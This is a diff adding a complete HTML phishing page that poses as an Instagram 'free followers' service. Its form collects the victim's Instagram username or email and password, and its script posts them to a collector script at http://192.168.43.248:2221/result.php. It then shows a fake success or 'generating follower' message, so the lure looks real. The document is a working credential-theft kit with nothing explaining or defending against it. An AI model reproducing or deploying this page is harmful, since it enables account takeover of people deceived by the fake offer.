@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #f9ce34, #ee2a7b, #6228d7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .form-container {
+            background: #fff;
+            padding: 2em;
+            border-radius: 1em;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+        .form-container h2 {
+            margin-top: 0;
+            color: #333;
+            text-align: center;
+        }
+        .form-container label {
+            font-weight: bold;
+            color: #333;
+        }
+        .form-container input[type="text"],
+        .form-container input[type="password"],
+        .form-container select {
+            width: calc(100% - 1em);
+            padding: 0.7em;
+            margin-bottom: 1em;
+            border: 1px solid #ccc;
+            border-radius: 0.5em;
+            font-size: 1em;
+        }
+        .form-container input[type="submit"] {
+            width: 100%;
+            padding: 0.7em;
+            color: #fff;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 0.5em;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+        }
+        .form-container input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        #response-message {
+            margin-top: 1em;
+            font-weight: bold;
+            color: green;
+            text-align: center;
+        }
+        .error-message {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Get Free Followers on Instagram</h2>
+        <form id="follower-form">
+            <label for="username">Instagram Username or Email:</label>
+            <input type="text" id="username" name="username" required>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <label for="followers">Select Number of Followers:</label>
+            <select id="followers" name="followers" required>
+                <option value="1000">1k</option>
+                <option value="5000">5k</option>
+                <option value="10000">10k</option>
+                <option value="15000">15k</option>
+            </select>
+            
+            <input type="submit" value="Submit">
+        </form>
+        <div id="response-message"></div>
+        <p style="text-align: center;">Your followers will be delivered within 1 hour.</p>
+    </div>
+
+    <script>
+        document.getElementById('follower-form').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            
+            // Collect form data and proceed with fetch
+            const formData = new FormData(this); // Collect form data
+
+            fetch('http://192.168.43.248:2221/result.php', { // Replace with your actual PHP script URL
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                document.getElementById('response-message').textContent = "Data submitted successfully!";
+                document.getElementById('response-message').classList.remove('error-message');
+            })
+            .catch(error => {
+                document.getElementById('response-message').textContent = "generating follower....: " + error.message;
+                document.getElementById('response-message').classList.add('error-message');
+            });
+        });
+    </script>
+</body>
+</html>
